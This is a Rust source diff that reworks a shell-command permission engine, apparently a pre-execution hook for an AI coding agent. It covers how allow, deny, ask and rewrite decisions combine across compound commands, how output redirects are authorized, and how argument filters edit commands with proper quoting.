+                engine.evaluate_sync(&command, &context, EvaluationPurpose::Decision)
+            }),
+        )
+        .await
+        {
+            Ok(Ok(evaluation)) => Ok(evaluation),
+            Ok(Err(error)) => Err(LiveEvaluationFailure::Join(error)),
+            Err(_) => Err(LiveEvaluationFailure::Timeout),
+        }
+    }
+}
 
-                CommandTrace {
-                    original: command.to_string(),
-                    bindings,
-                    sub_commands,
-                    bail: None,
-                    final_result: merge_results(results),
+impl CommandDecision {
+    fn outcome(&self) -> PolicyOutcome<'_> {
+        match self {
+            Self::NoMatch => PolicyOutcome::NoMatch,
+            Self::Allow { rule } => PolicyOutcome::Allow { rule },
+            Self::Deny { rule, reason } => PolicyOutcome::Deny { rule, reason },
+            Self::Modify { rule, new_command } => PolicyOutcome::Modify { rule, new_command },
+            Self::Ask { rule } => PolicyOutcome::Ask { rule },
+            Self::ArgumentFilter {
+                rule,
+                new_command,
+                reason,
+            } => PolicyOutcome::ArgumentFilter {
+                rule,
+                new_command,
+                reason: reason.as_deref(),
+            },
+        }
+    }
+
+    pub(crate) fn matched_rule(&self) -> Option<&MatchedCommandRule> {
+        match self {
+            Self::NoMatch => None,
+            Self::Allow { rule }
+            | Self::Deny { rule, .. }
+            | Self::Modify { rule, .. }
+            | Self::Ask { rule }
+            | Self::ArgumentFilter { rule, .. } => Some(rule),
+        }
+    }
+}
+
+impl EndpointAnalysis {
+    fn authorization(&self) -> RedirectAuthorizationView<'_> {
+        match self.matched_rule() {
+            Some(rule) => RedirectAuthorizationView::Authorized(rule),
+            None if self.failure_stage().is_some() => RedirectAuthorizationView::Unresolvable,
+            None => RedirectAuthorizationView::Unmatched,
+        }
+    }
+
+    fn matched_rule(&self) -> Option<&MatchedRedirectRule> {
+        match self {
+            Self::Descriptor { matched_rule, .. }
+            | Self::Filesystem {
+                resolution: FilesystemAnalysis::Resolved { matched_rule, .. },
+                ..
+            } => matched_rule.as_ref(),
+            Self::Filesystem {
+                resolution: FilesystemAnalysis::Failed { .. },
+                ..
+            } => None,
+        }
+    }
+
+    pub(crate) fn failure_stage(&self) -> Option<EndpointFailureStage> {
+        match self {
+            Self::Filesystem {
+                resolution: FilesystemAnalysis::Failed { stage, .. },
+                ..
+            } => Some(*stage),
+            Self::Descriptor { .. }
+            | Self::Filesystem {
+                resolution: FilesystemAnalysis::Resolved { .. },
+                ..
+            } => None,
+        }
+    }
+}
+
+impl MatchedCommandRule {
+    pub(crate) fn rule_name(&self) -> &str {
+        &self.metadata.rule_name
+    }
+
+    pub(crate) fn expanded_pattern(&self) -> &str {
+        &self.metadata.expanded_pattern
+    }
+
+    pub(crate) fn action_summary(&self) -> &str {
+        &self.metadata.action_summary
+    }
+}
+
+impl MatchedRedirectRule {
+    pub(crate) fn rule_name(&self) -> &str {
+        &self.metadata.rule_name
+    }
+
+    pub(crate) fn expanded_pattern(&self) -> &str {
+        &self.metadata.expanded_pattern
+    }
+
+    pub(crate) fn action_summary(&self) -> &str {
+        &self.metadata.action_summary
+    }
+}
+
+impl ResolvedRedirectTarget {
+    pub(crate) fn match_text(&self) -> &str {
+        &self.match_text
+    }
+
+    pub(crate) fn is_local(&self) -> bool {
+        self.is_local
+    }
+
+    pub(crate) fn kind(&self) -> RedirectEndpointKind {
+        self.kind
+    }
+}
+
+fn leaf_identity_and_redirects(leaf: LeafCommand) -> (LeafIdentity, Vec<OutputRedirectEndpoint>) {
+    let identity = LeafIdentity {
+        original: leaf.original,
+        alias_expanded: leaf.alias_expanded,
+        normalized: leaf.match_text,
+        bindings: leaf.bindings,
+        requires_confirmation: leaf.requires_confirmation,
+        command_shape: leaf.filter_command,
+    };
+    (identity, leaf.output_redirects)
+}
+
+impl LeafIdentity {
+    pub(crate) fn original(&self) -> &str {
+        &self.original
+    }
+
+    pub(crate) fn alias_expanded(&self) -> Option<&str> {
+        self.alias_expanded.as_deref()
+    }
+
+    pub(crate) fn normalized(&self) -> &str {
+        &self.normalized
+    }
+
+    pub(crate) fn bindings(&self) -> &[AliasBinding] {
+        &self.bindings
+    }
+
+    pub(crate) fn requires_confirmation(&self) -> Option<&str> {
+        self.requires_confirmation.as_deref()
+    }
+
+    pub(crate) fn command_shape(&self) -> Option<&FilterCommand> {
+        self.command_shape.as_ref()
+    }
+}
+
+impl EndpointCoverage {
+    pub(crate) fn analyzed(&self) -> Option<&[EndpointAnalysis]> {
+        match self {
+            Self::Analyzed(endpoints) => Some(endpoints),
+            Self::Skipped => None,
+        }
+    }
+}
+
+impl PolicyLeafAnalysis {
+    pub(crate) fn identity(&self) -> &LeafIdentity {
+        &self.identity
+    }
+
+    pub(crate) fn command(&self) -> &CommandDecision {
+        &self.command
+    }
+
+    pub(crate) fn endpoints(&self) -> &EndpointCoverage {
+        &self.endpoints
+    }
+
+    pub(crate) fn source_command_allowed(&self) -> bool {
+        matches!(self.command, CommandDecision::Allow { .. })
+    }
+
+    pub(crate) fn outcome(&self) -> PolicyOutcome<'_> {
+        let outcome = self.command.outcome();
+        let PolicyOutcome::Allow { rule } = outcome else {
+            return outcome;
+        };
+        let endpoints_allowed = match &self.endpoints {
+            EndpointCoverage::Analyzed(endpoints) => endpoints.iter().all(|endpoint| {
+                matches!(
+                    endpoint.authorization(),
+                    RedirectAuthorizationView::Authorized(_)
+                )
+            }),
+            EndpointCoverage::Skipped => false,
+        };
+        if endpoints_allowed && self.identity.requires_confirmation.is_none() {
+            outcome
+        } else {
+            PolicyOutcome::Ask { rule }
+        }
+    }
+}
+
+impl PolicyAnalysis {
+    pub(crate) fn leaves(&self) -> Option<&[PolicyLeafAnalysis]> {
+        match self {
+            Self::Leaves(leaves) => Some(leaves),
+            Self::Bail { .. } => None,
+        }
+    }
+
+    fn outcome(&self) -> PolicyOutcome<'_> {
+        match self {
+            Self::Bail { decision, .. } => match decision {
+                BailDecision::Deny { rule, reason } => PolicyOutcome::Deny { rule, reason },
+                BailDecision::NoMatch => PolicyOutcome::NoMatch,
+            },
+            Self::Leaves(leaves) if leaves.len() == 1 => leaves[0].outcome(),
+            Self::Leaves(leaves) => {
+                let best = leaves.iter().map(PolicyLeafAnalysis::outcome).fold(
+                    None,
+                    |best: Option<PolicyOutcome<'_>>, outcome| match best {
+                        Some(current) if policy_rank(current) >= policy_rank(outcome) => best,
+                        _ => Some(outcome),
+                    },
+                );
+                match best {
+                    Some(
+                        outcome @ (PolicyOutcome::Allow { .. }
+                        | PolicyOutcome::Deny { .. }
+                        | PolicyOutcome::Ask { .. }),
+                    ) => outcome,
+                    _ => PolicyOutcome::NoMatch,
                 }
             }
         }
     }
+}
 
-    pub(crate) fn split_command(&self, command: &str, cwd: &str) -> SplitOutcome {
-        split_command(command, cwd, &self.path_aliases)
+impl RedirectLeafAnalysis {
+    pub(crate) fn identity(&self) -> &LeafIdentity {
+        &self.identity
     }
 
-    fn evaluate_leaf(&self, leaf: &LeafCommand, mode: Option<PermissionMode>) -> RuleResult {
-        let mut result = self.apply_rules(&leaf.match_text, mode);
-        if leaf.real_file_write {
-            result = cap_allow_at_ask(result);
+    pub(crate) fn endpoints(&self) -> &[EndpointAnalysis] {
+        &self.endpoints
+    }
+}
+
+impl RedirectCheckAnalysis {
+    fn allows_rewrite(&self) -> bool {
+        match self {
+            Self::Bail { .. } => false,
+            Self::Leaves(leaves) => leaves.iter().all(|leaf| {
+                leaf.identity.requires_confirmation.is_none()
+                    && leaf.endpoints.iter().all(|endpoint| {
+                        matches!(
+                            endpoint.authorization(),
+                            RedirectAuthorizationView::Authorized(_)
+                        )
+                    })
+            }),
         }
-        if leaf.requires_confirmation.is_some() {
-            result = cap_allow_at_ask(result);
+    }
+}
+
+impl Evaluation {
+    pub(crate) fn original_analysis(&self) -> &PolicyAnalysis {
+        &self.original
+    }
+
+    pub(crate) fn continuation(&self) -> &OriginalContinuation {
+        &self.continuation
+    }
+
+    pub(crate) fn original_outcome(&self) -> PolicyOutcome<'_> {
+        self.original.outcome()
+    }
+
+    pub(crate) fn outcome(&self) -> PolicyOutcome<'_> {
+        let original = self.original_outcome();
+        match (&self.continuation, original) {
+            (OriginalContinuation::None, _) => original,
+            (
+                OriginalContinuation::ModifyRedirectCheck(check),
+                PolicyOutcome::Modify { rule, new_command },
+            ) => {
+                if check.allows_rewrite() {
+                    PolicyOutcome::Modify { rule, new_command }
+                } else {
+                    PolicyOutcome::Ask { rule }
+                }
+            }
+            (
+                OriginalContinuation::ArgumentFilterRecheck {
+                    recheck,
+                    continuation,
+                },
+                original @ PolicyOutcome::ArgumentFilter { .. },
+            ) => match (recheck.outcome(), continuation) {
+                (PolicyOutcome::Allow { .. }, _) => original,
+                (PolicyOutcome::ArgumentFilter { rule, .. }, _) => PolicyOutcome::Ask { rule },
+                (
+                    PolicyOutcome::Modify { rule, new_command },
+                    FilterContinuation::ModifyRedirectCheck(check),
+                ) => {
+                    if check.allows_rewrite() {
+                        PolicyOutcome::Modify { rule, new_command }
+                    } else {
+                        PolicyOutcome::Ask { rule }
+                    }
+                }
+                (outcome, _) => outcome,
+            },
+            _ => original,
         }
-        result
     }
 
-    /// The first rule matching `command`, rendered for explain output.
-    fn match_explanation(
-        &self,
-        command: &str,
-        mode: Option<PermissionMode>,
-    ) -> Option<RuleMatchExplanation> {
-        let rule = &self.rules[self.first_match_index(command, mode)?];
-        Some(RuleMatchExplanation {
-            rule_name: rule.name.clone(),
-            expanded_pattern: rule.expanded_pattern.clone(),
-            action_summary: action_summary(&rule.action),
-        })
-    }
-}
-
-/// Merges the per-leaf decisions of a compound command into a single decision.
-///
-/// Precedence guarantees a dangerous tail can never be hidden behind a safe head: any `Denied`
-/// leaf denies the whole command; otherwise any `Asked` leaf or any `NoMatch` leaf forces a
-/// prompt; only an all-`Allowed` command is allowed. A single-leaf command returns its decision
-/// verbatim, so existing single-command behavior — including `Modified` / `ArgumentFiltered` and
-/// the re-validation loop in `mod.rs` — is preserved exactly.
-fn merge_results(results: Vec<RuleResult>) -> RuleResult {
-    // Preserve today's exact single-command behavior (including the variants `mod.rs` re-validates).
-    if results.len() == 1 {
-        return results.into_iter().next().expect("length checked to be 1");
+    pub(crate) fn rule_result(&self) -> RuleResult {
+        self.outcome().into()
     }
 
-    // Collapse every leaf in a single pass by keeping the highest-precedence decision, retaining
-    // the first leaf at that precedence: a `Denied`/`Asked` keeps its originating rule, and an
-    // all-`Allowed` command is attributed to the first leaf. `>=` makes earlier leaves win ties.
-    let merged = results
-        .into_iter()
-        .fold(None, |best: Option<RuleResult>, result| match &best {
-            Some(current) if merge_rank(current) >= merge_rank(&result) => best,
-            _ => Some(result),
-        });
-
-    // `Denied`/`Asked`/`Allowed` are returned verbatim; everything else collapses to a prompt. A
-    // `Modified` / `ArgumentFiltered` leaf cannot be safely stitched back into a rewritten compound
-    // (brush `Word` is flat and `build_command` does not re-quote), so it prompts rather than
-    // risking an injection-prone rewrite, exactly like a `NoMatch` leaf.
-    match merged {
-        Some(
-            result @ (RuleResult::Denied { .. }
-            | RuleResult::Asked { .. }
-            | RuleResult::Allowed { .. }),
-        ) => result,
-        _ => RuleResult::NoMatch,
-    }
-}
-
-/// Precedence rank for [`merge_results`]: a more dangerous leaf outranks a safer one, so the merged
-/// decision is the strictest across the compound. `Modified` / `ArgumentFiltered` share the prompt
-/// rank with `NoMatch` because they cannot be re-stitched into a safe rewrite.
-fn merge_rank(result: &RuleResult) -> u8 {
-    match result {
-        RuleResult::Denied { .. } => 4,
-        RuleResult::Asked { .. } => 3,
-        RuleResult::NoMatch | RuleResult::Modified { .. } | RuleResult::ArgumentFiltered { .. } => {
-            2
+    pub(crate) fn contributors(&self) -> Vec<String> {
+        let mut contributors = Vec::new();
+        collect_policy_contributors(&self.original, &mut contributors);
+        match &self.continuation {
+            OriginalContinuation::None => {}
+            OriginalContinuation::ModifyRedirectCheck(check) => {
+                collect_redirect_contributors(check, &mut contributors);
+            }
+            OriginalContinuation::ArgumentFilterRecheck {
+                recheck,
+                continuation,
+            } => {
+                collect_policy_contributors(recheck, &mut contributors);
+                if let FilterContinuation::ModifyRedirectCheck(check) = continuation {
+                    collect_redirect_contributors(check, &mut contributors);
+                }
+            }
         }
-        RuleResult::Allowed { .. } => 1,
+        contributors
+            .into_iter()
+            .map(|contributor| contributor.rule_name().to_string())
+            .collect()
     }
 }
 
-/// Caps an `Allowed` decision at `Asked` for a leaf that writes to a real file, so a read-only
-/// allow-rule like `^echo` never silently green-lights `echo secret > real_file`.
-fn cap_allow_at_ask(result: RuleResult) -> RuleResult {
-    match result {
-        RuleResult::Allowed { rule_name } => RuleResult::Asked { rule_name },
-        other => other,
+impl From<PolicyOutcome<'_>> for RuleResult {
+    fn from(outcome: PolicyOutcome<'_>) -> Self {
+        match outcome {
+            PolicyOutcome::Allow { rule } => Self::Allowed {
+                rule_name: rule.rule_name().to_string(),
+            },
+            PolicyOutcome::Deny { rule, reason } => Self::Denied {
+                rule_name: rule.rule_name().to_string(),
+                reason: reason.to_string(),
+            },
+            PolicyOutcome::Modify { rule, new_command } => Self::Modified {
+                rule_name: rule.rule_name().to_string(),
+                new_command: new_command.to_string(),
+            },
+            PolicyOutcome::Ask { rule } => Self::Asked {
+                rule_name: rule.rule_name().to_string(),
+            },
+            PolicyOutcome::ArgumentFilter {
+                rule,
+                new_command,
+                reason,
+            } => Self::ArgumentFiltered {
+                rule_name: rule.rule_name().to_string(),
+                new_command: new_command.to_string(),
+                reason: reason.map(str::to_string),
+            },
+            PolicyOutcome::NoMatch => Self::NoMatch,
+        }
     }
 }
 
-/// For an un-analyzable (bailed) command, honor an explicit `Denied` but never let any other
-/// decision auto-allow. Returning `NoMatch` makes `mod.rs` prompt the user.
-fn downgrade_non_deny_to_ask(result: RuleResult) -> RuleResult {
-    match result {
-        denied @ RuleResult::Denied { .. } => denied,
-        _ => RuleResult::NoMatch,
+fn policy_rank(outcome: PolicyOutcome<'_>) -> u8 {
+    match outcome {
+        PolicyOutcome::Deny { .. } => 4,
+        PolicyOutcome::Ask { .. } => 3,
+        PolicyOutcome::NoMatch
+        | PolicyOutcome::Modify { .. }
+        | PolicyOutcome::ArgumentFilter { .. } => 2,
+        PolicyOutcome::Allow { .. } => 1,
+    }
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum MatchedContributor<'a> {
+    Command(&'a MatchedCommandRule),
+    Redirect(&'a MatchedRedirectRule),
+}
+
+impl MatchedContributor<'_> {
+    fn rule_name(&self) -> &str {
+        match self {
+            Self::Command(rule) => rule.rule_name(),
+            Self::Redirect(rule) => rule.rule_name(),
+        }
+    }
+}
+
+fn push_matched_contributor<'a>(
+    contributors: &mut Vec<MatchedContributor<'a>>,
+    contributor: MatchedContributor<'a>,
+) {
+    if !contributor.rule_name().is_empty() && !contributors.contains(&contributor) {
+        contributors.push(contributor);
+    }
+}
+
+fn collect_policy_contributors<'a>(
+    policy: &'a PolicyAnalysis,
+    contributors: &mut Vec<MatchedContributor<'a>>,
+) {
+    match policy {
+        PolicyAnalysis::Bail {
+            decision: BailDecision::Deny { rule, .. },
+            ..
+        } => push_matched_contributor(contributors, MatchedContributor::Command(rule)),
+        PolicyAnalysis::Bail {
+            decision: BailDecision::NoMatch,
+            ..
+        } => {}
+        PolicyAnalysis::Leaves(leaves) => {
+            for leaf in leaves {
+                if let Some(rule) = leaf.command.matched_rule() {
+                    push_matched_contributor(contributors, MatchedContributor::Command(rule));
+                }
+                if matches!(leaf.command, CommandDecision::Allow { .. })
+                    && let EndpointCoverage::Analyzed(endpoints) = &leaf.endpoints
+                {
+                    for endpoint in endpoints {
+                        if let Some(rule) = endpoint.matched_rule() {
+                            push_matched_contributor(
+                                contributors,
+                                MatchedContributor::Redirect(rule),
+                            );
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+fn collect_redirect_contributors<'a>(
+    check: &'a RedirectCheckAnalysis,
+    contributors: &mut Vec<MatchedContributor<'a>>,
+) {
+    if let RedirectCheckAnalysis::Leaves(leaves) = check {
+        for leaf in leaves {
+            for endpoint in &leaf.endpoints {
+                if let Some(rule) = endpoint.matched_rule() {
+                    push_matched_contributor(contributors, MatchedContributor::Redirect(rule));
+                }
+            }
+        }
     }
 }
 
@@ -721,142 +1586,91 @@ fn expand_captures(captures: &regex::Captures, template: &str) -> String {
     result
 }
 
-/// Parse a bash command into program and arguments using proper shell parsing.
-///
-/// Uses the `shell-words` crate to correctly handle:
-/// - Quoted arguments: `"hello world"` is parsed as a single argument
-/// - Escaped characters: `hello\ world` is parsed as a single argument "hello world"
-/// - Shell metacharacters: Commands with unmatched quotes or invalid syntax return errors
-///
-/// This provides security against command injection through malformed arguments
-/// that could bypass naive whitespace-based splitting.
-///
-/// # Returns
-/// Result containing tuple of (program, args) where program is the first token
-/// and args is the remaining tokens. Returns empty strings/vectors for empty commands.
-///
-/// # Errors
-/// Returns an error if the command contains invalid shell syntax (e.g., unmatched quotes).
-fn parse_command(command: &str) -> Result<(String, Vec<String>)> {
-    let parts = shell_words::split(command)
-        .map_err(|e| miette!("Failed to parse command as shell words: {}", e))?;
-
-    // Empty commands return empty strings/vectors. The security model delegates to the user
-    // via the Ask decision when no rules match (NoMatch result in handle_bash_pretool_hook).
-    if parts.is_empty() {
-        return Ok((String::new(), vec![]));
+fn quote_command_word(word: &str) -> String {
+    if !word.is_empty()
+        && word.bytes().all(|byte| {
+            byte.is_ascii_alphanumeric()
+                || matches!(
+                    byte,
+                    b'_' | b'@' | b'%' | b'+' | b'=' | b':' | b',' | b'.' | b'/' | b'-'
+                )
+        })
+    {
+        word.to_string()
+    } else {
+        shell_words::quote(word).into_owned()
     }
-
-    let program = parts[0].clone();
-    let args = parts[1..].to_vec();
-
-    Ok((program, args))
 }
 
-/// Reconstruct a command from program and arguments.
-fn build_command(program: &str, args: &[String]) -> String {
-    if args.is_empty() {
-        return program.to_string();
-    }
-
-    let mut result = String::from(program);
-    for arg in args {
-        result.push(' ');
-        result.push_str(arg);
-    }
-    result
-}
-
-/// Apply argument filters to a command, modifying it structurally rather than with regex.
-///
-/// # Design Rationale
-///
-/// The operation order (Remove → Replace → Add) establishes clear precedence for conflicting rules:
-///
-/// **Why Remove before Replace?**
-/// Removal rules must take precedence over replacement rules to ensure dangerous arguments
-/// are eliminated even if replacement rules target the same argument. Example:
-/// - Command: `rm -f file.txt`
-/// - Rules: remove `-f`, replace `-f` with `-i`
-/// - Correct behavior: `-f` is removed (security wins)
-/// - If replaced first: replacement could reintroduce a variant of the dangerous flag
-///
-/// This ordering guarantees: if an argument matches both remove and replace rules,
-/// it will be removed, not transformed.
-///
-/// **Why Replace before Add?**
-/// Security-added arguments must never be subject to user-defined transformation rules.
-/// Allowing replacements to modify added arguments would violate the security guarantee
-/// that certain flags will be present in the final command. Example:
-/// - Command: `docker run ubuntu`
-/// - Rules: replace `--read-only` with `--writable`, add `--read-only`
-/// - Wrong order: security adds `--read-only`, then user replacement removes it
-/// - Correct order: replacements run before add, so added flags are protected
-///
-/// This ordering guarantees: arguments added by security policies will appear in
-/// the final command exactly as specified, without user modifications.
-///
-/// **Why Add last?**
-/// Security flags must be appended after all user-defined transformations to ensure
-/// they cannot be removed or modified by any rules, establishing them as the final
-/// enforceable security boundary.
-///
-/// # Prefix Matching for --flag=value
-///
-/// The removal logic uses prefix matching for `--flag=value` syntax because:
-/// - Many commands accept both `--flag value` and `--flag=value` forms
-/// - Filtering `--open` should catch both `--open browser` and `--open=browser`
-/// - This prevents users from bypassing filters by changing flag syntax
-///
-/// However, prefix matching is carefully limited:
-/// - Only matches on the `=` boundary to avoid false positives
-/// - `--col` won't match `--color=always` (no `=` after "col")
-/// - `--open` will match `--open=browser` (exact prefix + `=`)
-///
-/// # Security Considerations
-///
-/// Uses proper shell parsing (via shell-words crate) to prevent injection attacks
-/// through malformed arguments that could bypass naive whitespace-based splitting.
-///
-/// # Errors
-/// Returns an error if the command contains invalid shell syntax.
 fn filter_arguments(
     command: &str,
+    filter_command: Option<&FilterCommand>,
     remove: &Option<Vec<String>>,
     add: &Option<Vec<String>>,
     replace: &Option<HashMap<String, String>>,
-) -> Result<String> {
-    let (program, mut args) = parse_command(command)?;
-
-    if let Some(remove_list) = remove {
-        args.retain(|arg| {
-            if remove_list.contains(arg) {
-                return false;
-            }
-
-            for remove_pattern in remove_list {
-                if arg.starts_with(&format!("{}=", remove_pattern)) {
-                    return false;
+) -> miette::Result<String> {
+    let filter_command = filter_command
+        .ok_or_else(|| miette!("ArgumentFilter requires one brush-parsed simple command"))?;
+    let mut edits = Vec::new();
+    for argument in &filter_command.arguments {
+        let removed = remove.as_ref().is_some_and(|patterns| {
+            patterns.iter().any(|pattern| {
+                argument.value == *pattern
+                    || argument
+                        .value
+                        .strip_prefix(pattern)
+                        .is_some_and(|suffix| suffix.starts_with('='))
+            })
+        });
+        // Removal wins so replacement cannot reintroduce an explicitly forbidden argument.
+        let replacement = if removed {
+            Some(String::new())
+        } else {
+            replace
+                .as_ref()
+                .and_then(|replacements| replacements.get(&argument.value))
+                .map(|replacement| quote_command_word(replacement))
+        };
+        if let Some(replacement) = replacement {
+            let mut range = argument.range.clone();
+            if replacement.is_empty() {
+                while let Some((index, ch)) = command[..range.start].char_indices().next_back()
+                    && ch.is_whitespace()
+                {
+                    range.start = index;
                 }
             }
-
-            true
-        });
-    }
-
-    if let Some(replace_map) = replace {
-        for arg in args.iter_mut() {
-            if let Some(replacement) = replace_map.get(arg) {
-                *arg = replacement.clone();
-            }
+            edits.push((range, replacement));
         }
     }
 
-    if let Some(add_list) = add {
-        args.extend(add_list.iter().cloned());
+    let mut filtered = command.to_string();
+    for (range, replacement) in edits.into_iter().rev() {
+        if filtered.get(range.clone()).is_none() {
+            return Err(miette!(
+                "ArgumentFilter received invalid brush source spans"
+            ));
+        }
+        filtered.replace_range(range, &replacement);
     }
-
-    Ok(build_command(&program, &args))
+    if let Some(additions) = add
+        && !additions.is_empty()
+    {
+        if !filtered.chars().last().is_some_and(char::is_whitespace) {
+            filtered.push(' ');
+        }
+        filtered.push_str(
+            &additions
+                .iter()
+                .map(|argument| quote_command_word(argument))
+                .collect::<Vec<_>>()
+                .join(" "),
+        );
+    }
+    Ok(format!(
+        "{}{}{}",
+        filter_command.rewrite_prefix, filtered, filter_command.rewrite_suffix
+    ))
 }
 
 #[cfg(test)]
